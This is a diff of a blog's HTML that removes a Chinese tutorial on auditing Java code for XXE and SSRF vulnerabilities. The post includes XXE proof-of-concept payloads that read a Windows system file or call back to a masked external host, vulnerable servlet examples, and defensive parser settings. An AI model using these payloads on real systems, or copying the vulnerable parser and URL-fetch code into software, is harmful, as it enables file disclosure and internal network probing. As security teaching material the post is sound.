-<h6 id="4-外部参数实体"><a href="#4-外部参数实体" class="headerlink" title="4)外部参数实体"></a>4)外部参数实体</h6><p>参数实体用于DTD和文档的内部子集中。与一般实体不同，是以字符（%）开始，以字符（;）结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。（Blind XXE攻击常利用参数实体进行数据回显）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % param1 &quot;Hello&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % param2 &quot; &quot;&gt;</span><br><span class="line">    &lt;!ENTITY % param3 &quot;World&quot;&gt;</span><br><span class="line">    &lt;!ENTITY dtd SYSTEM &quot;combine.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;content&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<p>combine.dtd中的内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY content &quot;%param1;%param2;%param3;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>上面combine.dtd中定义了一个基本实体，引用了3个参数实体：%param1;，%param2;，%param3;。<br>解析后<foo>…</foo>中的内容为Hello World。</p>
-<h4 id="0x03-XXE审计函数"><a href="#0x03-XXE审计函数" class="headerlink" title="0x03 XXE审计函数"></a>0x03 XXE审计函数</h4><p>XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可查看XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br><span class="line">…………</span><br></pre></td></tr></table></figure></p>
-<h4 id="0x04-常用测试POC"><a href="#0x04-常用测试POC" class="headerlink" title="0x04 常用测试POC"></a>0x04 常用测试POC</h4><h5 id="POC1-外部普通实体"><a href="#POC1-外部普通实体" class="headerlink" title="POC1-外部普通实体"></a>POC1-外部普通实体</h5><p>当有回显时，利用ftp协议来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lltest[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></p>
-<h5 id="POC2-外部参数实体"><a href="#POC2-外部参数实体" class="headerlink" title="POC2-外部参数实体"></a>POC2-外部参数实体</h5><p>无回显时 利用http协议来发起请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[ </span><br><span class="line">&lt;!ENTITY % lltest SYSTEM &quot;http://***.***.***.***:7777/lltest_xxe666&quot;&gt;</span><br><span class="line">%lltest;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
-<h4 id="0X05-XXE漏洞代码示例"><a href="#0X05-XXE漏洞代码示例" class="headerlink" title="0X05 XXE漏洞代码示例"></a>0X05 XXE漏洞代码示例</h4><p>解析XML的方法越来越多，常见有四种，即：DOM、DOM4J、JDOM 和SAX。下面以这四种为例展示XXE漏洞。</p>
-<h5 id="1-DOM-Read-XML"><a href="#1-DOM-Read-XML" class="headerlink" title="1) DOM Read XML"></a>1) DOM Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		</span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//DOM Read XML</span><br><span class="line">		DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     </span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();					</span><br><span class="line">		Document doc = db.parse(request.getInputStream());</span><br><span class="line">		</span><br><span class="line">		String username = getValueByTagName(doc,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName(doc,&quot;password&quot;);</span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125; catch (SAXException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125;</span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="2-DOM4J-Read-XML"><a href="#2-DOM4J-Read-XML" class="headerlink" title="2) DOM4J Read XML"></a>2) DOM4J Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		    </span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//DOM4J Read XML</span><br><span class="line">		SAXReader saxReader = new SAXReader();</span><br><span class="line">		Document document = saxReader.read(request.getInputStream());</span><br><span class="line">		 </span><br><span class="line">	    String username = getValueByTagName2(document,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName2(document,&quot;password&quot;);</span><br><span class="line">		 </span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;		 		 </span><br><span class="line">		</span><br><span class="line">	&#125; catch (DocumentException  e) &#123;</span><br><span class="line">		System.out.println(e.getMessage());</span><br><span class="line">	&#125; </span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="3-JDOM2-Read-XML"><a href="#3-JDOM2-Read-XML" class="headerlink" title="3) JDOM2 Read XML"></a>3) JDOM2 Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		       </span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//JDOM2 Read XML	</span><br><span class="line">		SAXBuilder builder = new SAXBuilder();	</span><br><span class="line">	    Document document = builder.build(request.getInputStream());</span><br><span class="line">		 </span><br><span class="line">	    String username = getValueByTagName3(document,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName3(document,&quot;password&quot;);</span><br><span class="line">		 </span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">	&#125; catch (JDOMException  e) &#123;</span><br><span class="line">		System.out.println(e.getMessage());</span><br><span class="line">	&#125; </span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="4-SAX-Read-XML"><a href="#4-SAX-Read-XML" class="headerlink" title="4) SAX Read XML"></a>4) SAX Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		</span><br><span class="line">	//https://blog.csdn.net/u011024652/article/details/51516220</span><br><span class="line">	String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//SAX Read XML</span><br><span class="line">		SAXParserFactory factory  = SAXParserFactory.newInstance(); </span><br><span class="line">		SAXParser saxparser = factory.newSAXParser();  </span><br><span class="line">		SAXHandler handler = new SAXHandler();  </span><br><span class="line">		saxparser.parse(request.getInputStream(), handler);</span><br><span class="line">		//为简单，没有提取子元素中的数据，只要调用parse()解析xml就已经触发xxe漏洞了</span><br><span class="line">           //没有回显  blind xxe</span><br><span class="line">		 result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,1);</span><br><span class="line"></span><br><span class="line">	&#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125; catch (SAXException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125;</span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="0x06-XXE漏洞防御"><a href="#0x06-XXE漏洞防御" class="headerlink" title="0x06 XXE漏洞防御"></a>0x06 XXE漏洞防御</h5><p>使用XML解析器时需要设置其属性，禁用DTDs或者禁止使用外部实体。</p>
-<p>以上例中DOM - DocumentBuilderFactory为例，防御代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); //禁用DTDs (doctypes),几乎可以防御所有xml实体攻击</span><br><span class="line">//如果不能禁用DTDs,可以使用下两项，必须两项同时存在</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);      //防止外部普通实体POC 攻击</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);   //防止外部参数实体POC攻击</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180918232137-894680ae-bb56-1.png" alt=""><br>其它XML解析器的漏洞防御可参考<br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</a></p>
-<p>上述XXE漏洞与防御完整示例代码 已上传Github  详见 <a href="https://github.com/pplsec/JavaVul/tree/master/MyXXE" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MyXXE</a></p>
-<h3 id="二、SSRF"><a href="#二、SSRF" class="headerlink" title="二、SSRF"></a>二、SSRF</h3><h4 id="0x01-SSRF漏洞简介"><a href="#0x01-SSRF漏洞简介" class="headerlink" title="0x01 SSRF漏洞简介"></a>0x01 SSRF漏洞简介</h4><p>SSRF(Server-Side Request Forge, 服务端请求伪造)，攻击者让服务端发起指定的请求，SSRF攻击的目标一般是从外网无法访问的内网系统。Java中的SSRF支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议:http，https，file，ftp，mailto，jar，netdoc。相对于php，在java中SSRF的利用局限较大，一般利用http协议来探测端口，利用file协议读取任意文件。</p>
-<h4 id="0x02-SSRF审计函数"><a href="#0x02-SSRF审计函数" class="headerlink" title="0x02 SSRF审计函数"></a>0x02 SSRF审计函数</h4><p>SSRF漏洞一般位于远程图片加载与下载、图片或文章收藏功能、URL分享、通过URL在线翻译、转码等功能点处。<br>代码审计时需要关注的发起HTTP请求的类及函数，部分如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HttpURLConnection. getInputStream</span><br><span class="line">URLConnection. getInputStream</span><br><span class="line">Request.Get. execute</span><br><span class="line">Request.Post. execute</span><br><span class="line">URL.openStream</span><br><span class="line">ImageIO.read</span><br><span class="line">OkHttpClient.newCall.execute</span><br><span class="line">HttpClients. execute</span><br><span class="line">HttpClient.execute</span><br><span class="line">……</span><br></pre></td></tr></table></figure></p>
-<h4 id="0x03-SSRF漏洞代码示例"><a href="#0x03-SSRF漏洞代码示例" class="headerlink" title="0x03 SSRF漏洞代码示例"></a>0x03 SSRF漏洞代码示例</h4><h5 id="1-HttpURLConnection"><a href="#1-HttpURLConnection" class="headerlink" title="1) HttpURLConnection"></a>1) HttpURLConnection</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> //HttpURLConnection ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream())); //发起请求,触发漏洞</span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = new StringBuffer(); </span><br><span class="line"></span><br><span class="line"> while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(&quot;html:&quot; + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure>
-<h5 id="2-urlConnection"><a href="#2-urlConnection" class="headerlink" title="2) urlConnection"></a>2) urlConnection</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//urlConnection ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //发起请求,触发漏洞</span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = new StringBuffer();</span><br><span class="line">while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(&quot;html:&quot; + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure>
-<h5 id="3-ImageIO"><a href="#3-ImageIO" class="headerlink" title="3) ImageIO"></a>3) ImageIO</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ImageIO ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); // 发起请求,触发漏洞</span><br></pre></td></tr></table></figure>
-<h5 id="4-其他"><a href="#4-其他" class="headerlink" title="4) 其他"></a>4) 其他</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// Request漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">return Request.Get(url).execute().returnContent().toString();//发起请求</span><br><span class="line"></span><br><span class="line">// openStream漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">inputStream = u.openStream();  //发起请求</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// OkHttpClient漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">OkHttpClient client = new OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  //发起请求</span><br><span class="line"></span><br><span class="line">// HttpClients漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = new HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); //发起请求</span><br></pre></td></tr></table></figure>
-<h4 id="0x04-SSRF漏洞防御"><a href="#0x04-SSRF漏洞防御" class="headerlink" title="0x04 SSRF漏洞防御"></a>0x04 SSRF漏洞防御</h4><p>1）限制协议为HTTP、HTTPS协议。<br>2）禁止30x跳转。<br>3）设置URL白名单或者限制内网IP。<br>4）限制请求的端口为http常用的端口。</p>
-<p>以上例中HttpURLConnection为例，防御代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">if (!SSRFHostCheck(url)) &#123;</span><br><span class="line">        System.out.println(&quot;warning!!! illegal url:&quot; + url);</span><br><span class="line">         return;</span><br><span class="line">&#125;    </span><br><span class="line">URL u = new URL(url);</span><br><span class="line"> </span><br><span class="line">URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">            </span><br><span class="line">httpUrl.setInstanceFollowRedirects(false); //禁止30x跳转</span><br><span class="line">            </span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream())); //send request</span><br><span class="line">……………………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static Boolean SSRFHostCheck(String url) &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">	   URL u = new URL(url);</span><br><span class="line">	   // 限制为http和https协议</span><br><span class="line">           if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) &#123;</span><br><span class="line">           String uProtocol = u.getProtocol();</span><br><span class="line">           System.out.println(&quot;illegal Protocol:&quot; + uProtocol);</span><br><span class="line">           return  false;</span><br><span class="line">         &#125;</span><br><span class="line">           </span><br><span class="line">          // 获取域名或IP，并转为小写</span><br><span class="line">          String host = u.getHost().toLowerCase();</span><br><span class="line">          String hostwhitelist = &quot;192.168.199.209&quot;;     //白名单    </span><br><span class="line">          if (host.equals(hostwhitelist)) &#123;</span><br><span class="line">       	   System.out.println(&quot;ok_host:&quot; + host);</span><br><span class="line">       	   return true;</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">           	System.out.println(&quot;illegal host:&quot; + host);</span><br><span class="line">           	return false;</span><br><span class="line">          &#125;</span><br><span class="line">	    &#125; catch (Exception e) &#123;</span><br><span class="line">	        return false;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
-<p>上述SSRF漏洞与防御完整示例代码 已上传Github  详见 <a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p>
-<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/1633" target="_blank" rel="noopener">https://xz.aliyun.com/t/1633</a><br><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review/" target="_blank" rel="noopener">http://rickgray.me/2015/06/08/xml-entity-attack-review/</a><br><a href="https://github.com/c0ny1/xxe-lab/blob/master/java_xxe/src/me/gv7/xxe/LoginServlet.java" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab/blob/master/java_xxe/src/me/gv7/xxe/LoginServlet.java</a><br><a href="https://joychou.org/java/javassrf.html" target="_blank" rel="noopener">https://joychou.org/java/javassrf.html</a><br><a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SSRF.java" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SSRF.java</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1987,7 +1988,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1998,7 +1999,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
